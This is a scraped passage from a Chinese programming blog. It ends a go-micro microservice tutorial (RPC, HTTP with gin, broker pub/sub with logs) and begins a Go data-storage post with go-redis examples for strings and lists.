[service] greeter2021-05-07 00:50:11 file=grpc/grpc.go:864 level=info Server [grpc] Listening on [::]:560142021-05-07 00:50:11 file=grpc/grpc.go:697 level=info Registry [mdns] Registering node: greeter-147bbaba-7f7e-46af-bb5e-81d311da0d1a 当然，我们也可以指定端口启动服务，这个参数传入的端口是优先于代码设置的 1go run main.go --server_address :8088 我们可以从服务器启动时打印的这些日志得到一些信息： RPC通信框架用的是gRPC，这是go-mico默认的； 我们启动的这个服务的名字叫greeter; 服务监听的端口是56014; 服务发现用的组件是mdns，这是go-mirco默认的; 我们也可以指定端口号来启动服务 1234junshideMacBook-Pro:micro_server junshili$ go run main.go --server_address :80882021-05-07 01:38:25 file=v2@v2.9.1/service.go:200 level=info Starting [service] greeter2021-05-07 01:38:25 file=grpc/grpc.go:864 level=info Server [grpc] Listening on [::]:8088 再启动client发起RPC调用 12junshideMacBook-Pro:micro_client junshili$ go run main.go Greet John 当我kill掉server时，会打印以下日志，表明：1.服务从服务发现组件注销注册了；2.Broker和该服务断开了连接。 1232021-05-07 01:32:38 file=grpc/grpc.go:791 level=info Deregistering node: greeter-5e32cdd2-4099-4ee9-b2df-bdeee2cd5ff42021-05-07 01:32:38 file=grpc/grpc.go:959 level=info Broker [http] Disconnected from 127.0.0.1:0 注意，使用micro/v2时,protoc3生成micro.protoc文件可能会导致版本冲突，在go run main.go时会报错： 12345使用micro/v2时,protoc3生成micro.protoc文件导致的版本冲突cannot use service.Server() (type“github.com/micro/go-micro/v2/server”.Server) as type“github.com/micro/micro/v3/service/server” 解决方案：可将生成的*.pb.micro.go文件中的v3依赖改为v2依赖即可 1234567import ( context &quot;context&quot; client &quot;github.com/micro/go-micro/v2/client&quot; server &quot;github.com/micro/go-micro/v2/server&quot; api &quot;github.com/micro/micro/v3/service/api&quot; ) 新建服务 (基于micro v3)现在go micro已经推出了V3版本，因为V3和V2版本有较多的不同，且存在兼容性不足的问题。下面的所有例子都是基于V3的实践。 首先给出官方的上手文档:https://micro.mu/getting-started 首先安装/升级自己的micro版本至V3 1go get github.com/micro/micro/v3 安装完之后，启动micro相关的服务进程 12345678910111213141516junshideMacBook-Pro:~ junshili$ micro server2021-05-09 00:32:01 file=server/server.go:86 level=info Starting server2021-05-09 00:32:01 file=server/server.go:114 level=info Registering network2021-05-09 00:32:01 file=server/server.go:114 level=info Registering runtime2021-05-09 00:32:01 file=server/server.go:114 level=info Registering registry2021-05-09 00:32:01 file=server/server.go:114 level=info Registering config2021-05-09 00:32:01 file=server/server.go:114 level=info Registering store2021-05-09 00:32:01 file=server/server.go:114 level=info Registering broker2021-05-09 00:32:01 file=server/server.go:114 level=info Registering events2021-05-09 00:32:01 file=server/server.go:114 level=info Registering auth2021-05-09 00:32:01 file=server/server.go:114 level=info Registering proxy2021-05-09 00:32:01 file=server/server.go:114 level=info Registering api2021-05-09 00:32:01 file=server/server.go:201 level=info Starting server runtime2021-05-09 00:32:01 file=service/service.go:195 level=info Starting [service] server2021-05-09 00:32:01 file=grpc/grpc.go:939 level=info Server [grpc] Listening on [::]:100012021-05-09 00:32:01 file=grpc/grpc.go:769 level=info Registry [mdns] Registering node: server-fc07e464-99c4-406d-b608-b54ef3c9bdde 可以注意到，registry,auth等Micro组件都启动起来了。与V2版本不一样的是，接下来需要登录账号，做身份验证。这一步很重要，不然没有登录，后续操作micro会提示权限不足。username固定为admin,password固定为micro。 1234$ micro loginEnter username: adminEnter password:Successfully logged in. 查看micro框架下跑着哪些服务，可以看到这些服务都是micro框架自带的，在我们执行micro server时启动。 123456789101112junshideMacBook-Pro:~ junshili$ micro servicesapiauthbrokerconfigeventsnetworkproxyregistryruntimeserverstore 现在我们打算启动一个自己的服务，micro v3提供了一个非常好用的服务生成工具，可以帮我们直接生成服务模板，我们只需要在模板上增添自己的内容就可以了，生产效率大幅提升。使用micro new 服务名就可以生成模板代码。服务名不要使用下划线。 123456789101112131415161718junshideMacBook-Pro:~ junshili$ micro new hellodemoCreating service hellodemo.├── micro.mu├── main.go├── generate.go├── handler│ └── hellodemo.go├── proto│ └── hellodemo.proto├── Dockerfile├── Makefile├── README.md├── .gitignore└── go.mod 进入项目目录，编译协议 123junshideMacBook-Pro:hellodemo junshili$ make protoprotoc --proto_path=. --micro_out=. --go_out=:. proto/hellodemo.proto 在proto目录下自动生成了pb.go和.pb.micro.go的文件。 123456789101112131415../hellodemo/├── Dockerfile├── Makefile├── README.md├── generate.go├── go.mod├── handler│ └── hellodemo.go├── main.go├── micro.mu└── proto ├── hellodemo.pb.go ├── hellodemo.pb.micro.go └── hellodemo.proto 启动我们的服务 1junshideMacBook-Pro:hellodemo junshili$ micro run . 查看我们的服务是否正常启动 1234567891011121314151617junshideMacBook-Pro:hellodemo junshili$ micro servicesapiauthbrokerconfigeventshellodemonetworkproxyregistryruntimeserverstorejunshideMacBook-Pro:hellodemo junshili$ micro statusNAME VERSION SOURCE STATUS BUILD UPDATED METADATAhellodemo latest /Users/junshili/hellodemo running n/a 1m58s ago owner=admin, group=micro 可以看到，我们的服务正常运行在micro框架之内。现在我们要基于这个服务模板做点自己的修改。 现在协议文件上增加rpc 函数和消息结构体。 1234567891011121314151617service Hellodemo { rpc Call(Request) returns (Response) {} rpc Stream(StreamingRequest) returns (stream StreamingResponse) {} rpc PingPong(stream Ping) returns (stream Pong) {} rpc Greet(GreetReq) returns (GreetRsp) {}}message GreetReq { string name = 1; int32 age = 2;}message GreetRsp { string msg = 1; int32 status = 2;} 再到在handler/hellodemo.go这个文件里，加一个自己的Greet的实现。 123456func (e *Hellodemo) Greet(ctx context.Context, req *hellodemo.GreetReq, rsp *hellodemo.GreetRsp) error { log.Info(&quot;Received Hellodemo.Greet request&quot;) rsp.Msg = fmt.Sprintf(&quot;Greet %s, your age is %d&quot;, req.Name, req.Age) rsp.Status = 200 return nil} 我们的功能代码已经完成编写，准备把服务更新一下，因为服务已经在run了，所以我们直接使用micro update .把服务更出去，类似于我们常用的热更，不停服更新。然后用micro logs hellodemo看下输出日志是否正常。确认启动正常后，我们可以使用micro框架cli给该服务直接发送请求，测试服务可用性，而无须再写测试client。 先用help指令查看hellodemo对外提供了哪些可调用的方法。 12345678910111213141516junshideMacBook-Pro:hellodemo junshili$ micro hellodemo --helpNAME: micro hellodemoVERSION: latestUSAGE: micro hellodemo [command]COMMANDS: call greet pingPong stream 我们测试下call和greet方法。 12345678910junshideMacBook-Pro:hellodemo junshili$ micro hellodemo call --name=James{ &quot;msg&quot;: &quot;Hello James&quot;}junshideMacBook-Pro:hellodemo junshili$ micro hellodemo greet --name=James --age=20{ &quot;msg&quot;: &quot;Greet James, your age is 20&quot;, &quot;status&quot;: 200} 我们同样可以通过http的方式访问请求RPC，中介是micro的api服务，请求会通过api服务，再调到我们制定的服务。默认API的address是127.0.0.1:8080。 12junshideMacBook-Pro:helloworld junshili$ curl -XPOST --header &quot;Content-Type: application/json&quot; -d '{&quot;name&quot;:&quot;Joe&quot;, &quot;age&quot;:30}' http://127.0.0.1:8080/hellodemo/greet{&quot;msg&quot;:&quot;Greet Joe, your age is 30&quot;,&quot;status&quot;:200} 搭建Http服务上面介绍了搭建RPC服务的流程，如果要搭建HTTP服务，其实跟上面流程一样，区别只在于在main.go中调用http相关相关处理即可，比如我们使用gin来实现我们的http服务。 第一步先micro new helloweb，创建服务模板，然后我们之间在main.go添加http处理的相关代码： 1234567891011121314151617181920212223242526272829303132package mainimport ( &quot;net/http&quot; &quot;github.com/gin-gonic/gin&quot;)func HelloWeb(c *gin.Context) { c.String(http.StatusOK, &quot;Hello, Go\\n&quot;)}func HiWeb(c *gin.Context) { c.String(http.StatusOK, &quot;Hi, Go\\n&quot;)}func main() { // 使用gin作为路由 r := gin.Default() r.GET(&quot;/hello&quot;, func(c *gin.Context) { HelloWeb(c) }) r.POST(&quot;/hi&quot;, func(c *gin.Context) { HiWeb(c) }) r.Run(&quot;:9999&quot;) // listen and serve on 0.0.0.0:9999} 请求和响应如下，如果想要构建更复杂的http项目，请参考我的上一篇文章:Go快速上手—Web服务器篇. 12345junshideMacBook-Pro:blog junshili$ curl -X POST http://127.0.0.1:9999/hiHi, GojunshideMacBook-Pro:blog junshili$ curl http://127.0.0.1:9999/helloHello, Go 需要kill掉这个服务，需要使用 1micro kill example 发布订阅(基于消息队列的异步通信)发布订阅模式在后台服务中广泛使用，go micro框架中，Broker服务就是用于支持发布订阅模式（pub/sub）。发布订阅模式，我们一般使用消息队列作为中间件实现异步通信，从而做到系统解耦、削峰稳流。在go micro框架中，Broker就是负责消息队列这个功能，消息生产者负责生产消息，推送给Broker，消息消费者server向Broker订阅指定类型的消息（我们称为topic），即Broker注册自己的消息处理，一旦有消息到来，则调用响应的消息处理逻辑。Micro的Broker默认使用了Nats作为消息队列，同时他也支持业界常用的消息队列，比如Kafka,RabbitMQ等，因此我们可以根据我们的需求选择消息队列组件作为Broker的底层支持。 Micro内置的Pub/Sub模式很简单易用，用户只需要定义好publisher, subscriber以及消息内容，其他工作都将由框架实现。这里给出micor pub/sub的实践案例。 Broker、publisher、subscriber三者通信的消息结构体为Message，Message结构体的定义如下。 1234type Message struct { Header map[string]string Body []byte} 消息订阅者的实现消息订阅如下： subscrber先连接上broker，broker.Connect() 对指定的topic进行注册，broker.Subscribe。特殊地，如果是点对点通信，那需要在，broker.Subscribe的第三个参数加上broker.Queue(topic)。如果是发布订阅模式则不需要。 实现消息处理函数，传入broker.Subscribe第二个参数。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package mainimport ( &quot;fmt&quot; &quot;github.com/micro/micro/v3/service&quot; &quot;github.com/micro/micro/v3/service/logger&quot; &quot;github.com/micro/go-micro/broker&quot;)var topic1 = &quot;topic1&quot;var topic2 = &quot;topic2&quot;func handleEvent(b broker.Event) error { msg := string(b.Message().Body) logger.Infof(&quot;[sub] recieve message: %s, header: %s\\n&quot;, msg, b.Message().Header) return nil}// 点对点消息通信，消息不会复制，只会被一个消费者消费func subTopicQ(topic string) { _, err := broker.Subscribe(topic, handleEvent, broker.Queue(topic)) if err != nil { fmt.Println(err) }}// 发布订阅模式消息通信，消息会复制，可以被多个消费者消费func subTopic(topic string) { _, err := broker.Subscribe(topic, handleEvent) if err != nil { fmt.Println(err) }}func main() { // Create service srv := service.New( service.Name(&quot;hellosubscriber&quot;), service.Version(&quot;latest&quot;), ) srv.Init() if err := broker.Connect(); err != nil { logger.Error(&quot;Broker Connect error: &quot;, err) } subTopic(topic1) subTopicQ(topic2) // Run service if err := srv.Run(); err != nil { logger.Fatal(err) }} 消息发布的实现消息发布的步骤如下： publisher先连接上broker，broker.Connect() broker.Publish(topic, msg) 直接对指定topic发送消息。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960package mainimport ( &quot;fmt&quot; &quot;github.com/micro/micro/v3/service&quot; &quot;github.com/micro/micro/v3/service/logger&quot; &quot;github.com/micro/go-micro/broker&quot; &quot;time&quot; &quot;github.com/pborman/uuid&quot;)var topic1 = &quot;topic1&quot;var topic2 = &quot;topic2&quot;func handleEvent(b broker.Event) error { msg := string(b.Message().Body) logger.Infof(&quot;[sub] recieve message: %s, header: %s\\n&quot;, msg, b.Message().Header) return nil}// 发布消息func pubTopic(topic string) { for range time.Tick(time.Second) { msg := &amp;broker.Message { Header: map[string]string { &quot;id&quot;: uuid.NewUUID().String(), }, Body: []byte(fmt.Sprintf(&quot;Messaging you all day on %s&quot;, topic)), } if err := broker.Publish(topic, msg); err != nil { logger.Error(&quot;Broker Publish error: &quot;, err) } else { logger.Infof(&quot;Broker Publish topic:%s msg: %s&quot;, topic, msg) } }}func main() { // Create service srv := service.New( service.Name(&quot;hellopublisher&quot;), service.Version(&quot;latest&quot;), ) srv.Init() if err := broker.Connect(); err != nil { logger.Error(&quot;Broker Connect error: &quot;, err) } go pubTopic(topic1) go pubTopic(topic2) // Run service if err := srv.Run(); err != nil { logger.Fatal(err) }} 实践过程： 订阅服务，我起了两个，命名为sub1,sub2 发布服务，我起了pub，pub里两个协程向topic1和topic2发送消息 1234567891011121314151617181920212223242526272829303132micro run --name sub1 .micro run --name sub2 .micro run --name pub .unshideMacBook-Pro:hellosubcriber junshili$ micro status NAME VERSION SOURCE STATUS BUILD UPDATED METADATApub latest /Users/junshili/hellopublisher running n/a 1m48s ago owner=admin, group=microsub1 latest /Users/junshili/hellosubcriber running n/a 13s ago owner=admin, group=microsub2 latest /Users/junshili/hellosubcriber running n/a 6s ago owner=admin, group=microjunshideMacBook-Pro:hellosubcriber junshili$ micro stats --all customSERVICE hellopublisherVERSION latestNODE ADDRESS:PORT STARTED UPTIME MEMORY THREADS GChellopublisher-a5c3156e-cb26-40af-b899-092195a49fd4 192.168.1.101:54250 May 13 00:46:28 2m5s 2.88mb 43 10.670273msSERVICE hellosubscriberVERSION latestNODE ADDRESS:PORT STARTED UPTIME MEMORY THREADS GChellosubscriber-7035f6b4-ebd8-4dbf-bb10-eb49cf7ca34c 192.168.1.101:54578 May 13 00:48:13 21s 2.54mb 33 114.399µshellosubscriber-aa456e83-c035-43dc-9a71-a459c2c058c3 192.168.1.101:54572 May 13 00:48:13 21s 2.63mb 33 121.528µs 我们使用micro logs -f helloworld 或者 micro logs helloworld查看服务输出的日志。 先观察pub服务的日志，pub在向发送topic1和topic2消息 123456789102021-05-13 00:46:29 file=blob-940620946/main.go:34 level=info Broker Publish topic:topic2 msg: &amp;{map[id:99b30102-b341-11eb-b5c8-acde48001122] Messaging you all day on topic2}2021-05-13 00:46:29 file=blob-940620946/main.go:34 level=info Broker Publish topic:topic1 msg: &amp;{map[id:99b30184-b341-11eb-b5c8-acde48001122] Messaging you all day on topic1}2021-05-13 00:46:30 file=blob-940620946/main.go:34 level=info Broker Publish topic:topic2 msg: &amp;{map[id:9a4af598-b341-11eb-b5c8-acde48001122] Messaging you all day on topic2}2021-05-13 00:46:30 file=blob-940620946/main.go:34 level=info Broker Publish topic:topic1 msg: &amp;{map[id:9a4af692-b341-11eb-b5c8-acde48001122] Messaging you all day on topic1}2021-05-13 00:46:31 file=blob-940620946/main.go:34 level=info Broker Publish topic:topic1 msg: &amp;{map[id:9ae409d6-b341-11eb-b5c8-acde48001122] Messaging you all day on topic1}2021-05-13 00:46:31 file=blob-940620946/main.go:34 level=info Broker Publish topic:topic2 msg: &amp;{map[id:9ae40ae4-b341-11eb-b5c8-acde48001122] Messaging you all day on topic2}2021-05-13 00:46:32 file=blob-940620946/main.go:34 level=info Broker Publish topic:topic2 msg: &amp;{map[id:9b7ca894-b341-11eb-b5c8-acde48001122] Messaging you all day on topic2}2021-05-13 00:46:32 file=blob-940620946/main.go:34 level=info Broker Publish topic:topic1 msg: &amp;{map[id:9b7ca7ea-b341-11eb-b5c8-acde48001122] Messaging you all day on topic1}2021-05-13 00:46:33 file=blob-940620946/main.go:34 level=info Broker Publish topic:topic1 msg: &amp;{map[id:9c152dc6-b341-11eb-b5c8-acde48001122] Messaging you all day on topic1}2021-05-13 00:46:33 file=blob-940620946/main.go:34 level=info Broker Publish topic:topic2 msg: &amp;{map[id:9c152a88-b341-11eb-b5c8-acde48001122] Messaging you all day on topic2} 观察sub1的日志 12345678910111213141516171819202122232425262021-05-13 00:50:14 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic2, header: map[id:1fcede3c-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:14 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:1fcedfb8-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:15 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic2, header: map[id:2067d614-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:15 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:2067d876-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:16 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic2, header: map[id:20ffd928-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:16 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:20ffd6c6-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:17 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic2, header: map[id:2198c3d6-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:17 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:2198c2e6-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:18 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic2, header: map[id:22317f90-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:18 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:22318634-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:19 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:22ca283a-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:19 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic2, header: map[id:22ca25b0-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:20 file=blob-924495561/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:23628e5e-b342-11eb-b5c8-acde48001122] 观察sub2的日志 1234567891011121314151617181920212223242021-05-13 00:50:14 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:1fcedfb8-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:15 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:2067d876-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:16 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:20ffd6c6-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:17 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:2198c2e6-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:18 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:22318634-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:19 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:22ca283a-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:20 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic2, header: map[id:23628d1e-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:20 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:23628e5e-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:21 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic2, header: map[id:23fb6cc8-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:21 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:23fb6d90-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:22 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic2, header: map[id:24940438-b342-11eb-b5c8-acde48001122]2021-05-13 00:50:22 file=blob-694627220/main.go:15 level=info [sub] recieve message: Messaging you all day on topic1, header: map[id:2494015e-b342-11eb-b5c8-acde48001122] 对比sub1和sub2的日志可以看出，sub1和sub2都能收到topic1的消息，证实topic1可以被多个订阅者消费，符合发布订阅模式。至于topic2，只能被一个消费者消费，不存在一条消息被多个消费者消费的情况，对应的是点对点消息队列通信机制。因此，需要区分这两种通信机制的go micro写法。 go micro默认的消息队列组件是自己实现的，实际上其实就是一个map，topic是map的key，发布消息时就往map里存，然后broker调度给订阅了该topic的服务推送。生产环境请更换为kafka,rabbitmq这类专用消息队列。 https://github.com/micro/micro/blob/master/service/broker/memory/memory.go 12345678910111213141516type memoryBroker struct { opts broker.Options addr string sync.RWMutex connected bool Subscribers map[string][]*memorySubscriber}type memorySubscriber struct { id string topic string exit chan bool handler broker.Handler opts broker.SubscribeOptions} go micro broker支持的消息队列在以下链接可以获取：https://github.com/microhq/go-plugins/tree/master/broker","link":"/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6go-micro/"},{"title":"Go快速上手--数据存储（redis,mysql,mongodb）","text":"Redis安装和启动Redis 12345sudo apt install redis-serversudo service redis-server startgo get github.com/go-redis/redis/v8 通过cli连接redis 1redis-cli -h 127.0.0.1 -p 6379 redis 五大数据结构: redis五大数据结构的使用实践案例如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455package mainimport ( &quot;context&quot; &quot;fmt&quot; &quot;time&quot; &quot;github.com/go-redis/redis/v8&quot;)var ctx = context.Background()func main() { rdb := redis.NewClient(&amp;redis.Options{ Addr: &quot;127.0.0.1:6379&quot;, Password: &quot;&quot;, DB: 0, }) pong, err := rdb.Ping(ctx).Result() if err != nil { fmt.Printf(&quot;连接redis出错，错误信息：%v&quot;, err) return } else { fmt.Println(&quot;成功连接redis,&quot;, pong) } // ======================key val get set============================================ // set key val操作 err = rdb.Set(ctx, &quot;guid&quot;, &quot;89_1909979_2232118&quot;, 0).Err() if err != nil { fmt.Printf(&quot;redis set失败，错误信息：%v&quot;, err) } // get key val操作 val, err := rdb.Get(ctx, &quot;guid&quot;).Result() if err != nil { fmt.Printf(&quot;redis get失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis get成功，key：%s, val:%s\\n&quot;, &quot;guid&quot;, val) } // 删除一个key err = rdb.Del(ctx, &quot;guid&quot;).Err() if err != nil { fmt.Printf(&quot;redis Del失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis Del成功，key：%s\\n&quot;, &quot;guid&quot;) } val, err = rdb.Get(ctx, &quot;guidxx&quot;).Result() if err != nil { fmt.Printf(&quot;redis get失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis get成功，key：%s, val:%s\\n&quot;, &quot;guidxx&quot;, val) } // set key val NX, key不存在才set, 并设置指定过期时间 err = rdb.SetNX(ctx, &quot;task&quot;, &quot;123&quot;, 10*time.Second).Err() if err != nil { fmt.Printf(&quot;redis SetNX失败，错误信息：%v\\n&quot;, err) } time.Sleep(time.Duration(1)*time.Second) // 获取过期剩余时间 tm, err := rdb.TTL(ctx, &quot;task&quot;).Result() if err != nil { fmt.Printf(&quot;redis TTL失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis TTL成功，key：%s, tm:%v\\n&quot;, &quot;task&quot;, tm) } val, err = rdb.Get(ctx, &quot;task&quot;).Result() if err != nil { fmt.Printf(&quot;redis get失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis get成功，key：%s, val:%s\\n&quot;, &quot;task&quot;, val) } time.Sleep(time.Duration(11)*time.Second) val, err = rdb.Get(ctx, &quot;task&quot;).Result() if err != nil { fmt.Printf(&quot;redis get失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis get成功，key：%s, val:%s\\n&quot;, &quot;task&quot;, val) } // 对key设置newValue这个值，并且返回key原来的旧值。原子操作。 oldVal, err := rdb.GetSet(ctx, &quot;task&quot;, &quot;456&quot;).Result() if err != nil { fmt.Printf(&quot;redis GetSet失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis GetSet成功，key：%s, oldVal:%s\\n&quot;, &quot;task&quot;, oldVal) } // 批量get set err = rdb.MSet(ctx, &quot;key1&quot;, &quot;val1&quot;, &quot;key2&quot;, &quot;val2&quot;, &quot;key3&quot;, &quot;val3&quot;).Err() if err != nil { fmt.Printf(&quot;redis MSet失败，错误信息：%v\\n&quot;, err) } vals, err := rdb.MGet(ctx, &quot;key1&quot;, &quot;key2&quot;, &quot;key3&quot;).Result() if err != nil { fmt.Printf(&quot;redis MGet失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis MGet成功，vals：%v\\n&quot;, vals) } // 自增自减，原子操作 err = rdb.Incr(ctx, &quot;age&quot;).Err() if err != nil { fmt.Printf(&quot;redis Incr失败，错误信息：%v\\n&quot;, err) } // +5 err = rdb.IncrBy(ctx, &quot;age&quot;, 5).Err() if err != nil { fmt.Printf(&quot;redis IncrBy失败，错误信息：%v\\n&quot;, err) } err = rdb.Decr(ctx, &quot;age&quot;).Err() if err != nil { fmt.Printf(&quot;redisDecr失败，错误信息：%v\\n&quot;, err) } // -3 err = rdb.DecrBy(ctx, &quot;age&quot;, 3).Err() if err != nil { fmt.Printf(&quot;redis DecrBy失败，错误信息：%v\\n&quot;, err) } // 2 val, err = rdb.Get(ctx, &quot;age&quot;).Result() if err != nil { fmt.Printf(&quot;redis get失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis get成功，key：%s, val:%s\\n&quot;, &quot;age&quot;, val) } // 对key设置过期时间 rdb.Expire(ctx, &quot;key1&quot;, 3*time.Second) tm, err = rdb.TTL(ctx, &quot;key1&quot;).Result() if err != nil { fmt.Printf(&quot;redis TTL失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis TTL成功，key：%s, tm:%v\\n&quot;, &quot;key1&quot;, tm) } //批量删除 err = rdb.Del(ctx, &quot;key1&quot;, &quot;key2&quot;, &quot;key3&quot;).Err() if err != nil { fmt.Printf(&quot;redis Del失败，错误信息：%v\\n&quot;, err) } // =====================list============================= // LPushX 从左往右插入 // //仅当列表存在的时候才插入数据,此时列表不存在，无法插入 err = rdb.LPushX(ctx, &quot;uids&quot;, 120).Err() if err != nil { fmt.Printf(&quot;redis LPushX失败，错误信息：%v\\n&quot;, err) } // /此时列表不存在，依然可以插入 err = rdb.LPush(ctx, &quot;uids&quot;, 130).Err() if err != nil { fmt.Printf(&quot;redis LPush失败，错误信息：%v\\n&quot;, err) } // 批量插入 err = rdb.LPushX(ctx, &quot;uids&quot;, 130, 140, 154, 132).Err() if err != nil { fmt.Printf(&quot;redis LPush失败，错误信息：%v\\n&quot;, err) } // 返回全部数据 vals2, err := rdb.LRange(ctx, &quot;uids&quot;, 0, -1).Result() if err != nil { fmt.Printf(&quot;redis LRange失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis LRange成功，key：%s, vals:%v\\n&quot;, &quot;uids&quot;, vals2) // redis LRange成功，key：uids, vals:[132 154 140 130 130] } // 取队列[2,4]的数据，即第3，4，5位置数据 vals2, err = rdb.LRange(ctx, &quot;uids&quot;, 2, 4).Result() if err != nil { fmt.Printf(&quot;redis LRange失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis LRange成功，key：%s, vals:%v\\n&quot;, &quot;uids&quot;, vals2) // redis LRange成功，key：uids, vals:[140 130 130] } // 返回队列长度 llen, err := rdb.LLen(ctx, &quot;uids&quot;).Result() if err != nil { fmt.Printf(&quot;redis LLen失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis LLen成功，key：%s, llen:%v\\n&quot;, &quot;uids&quot;, llen) // redis LLen成功，key：uids, llen:5 } // 修改list中指定位置的值 err = rdb.LSet(ctx, &quot;uids&quot;, 2, 1000).Err() if err != nil { fmt.Printf(&quot;redis LSet失败，错误信息：%v\\n&quot;, err) } // 返回全部数据 vals2, err = rdb.LRange(ctx, &quot;uids&quot;, 0, -1).Result() if err != nil { fmt.Printf(&quot;redis LRange失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis LRange成功，key：%s, vals:%v\\n&quot;, &quot;uids&quot;, vals2) //redis LRange成功，key：uids, vals:[132 154 1000 130 130] } // 出队列，左进右出 err = rdb.RPop(ctx, &quot;uids&quot;).Err() if err != nil { fmt.Printf(&quot;redis RPop失败，错误信息：%v\\n&quot;, err) } vals2, err = rdb.LRange(ctx, &quot;uids&quot;, 0, -1).Result() if err != nil { fmt.Printf(&quot;redis LRange失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis LRange成功，key：%s, vals:%v\\n&quot;, &quot;uids&quot;, vals2) } // 出队列，左进右出。没有就会阻塞，可以设置阻塞超时值 err = rdb.BRPop(ctx, time.Duration(1)*time.Second, &quot;uids&quot;).Err() if err != nil { fmt.Printf(&quot;redis BRPop失败，错误信息：%v\\n&quot;, err) } // 删除一定位置范围内的值。删除count个key的list中值为value 的元素。如果出现重复元素，仅删除1次，也就是删除第一个 err = rdb.LRem(ctx, &quot;uids&quot;, 3, 130).Err() if err != nil { fmt.Printf(&quot;redis LRem失败，错误信息：%v\\n&quot;, err) } // 返回全部数据 vals2, err = rdb.LRange(ctx, &quot;uids&quot;, 0, -1).Result() if err != nil { fmt.Printf(&quot;redis LRange失败，错误信息：%v\\n&quot;, err) } else { fmt.Printf(&quot;redis LRange成功，key：%s, vals:%v\\n&quot;, &quot;uids&quot;, vals2) //redis LRange成功，key：uids, vals:[132 154 1000] } // =====================================集合操作============================= //redis集合特性：元素无序且唯一 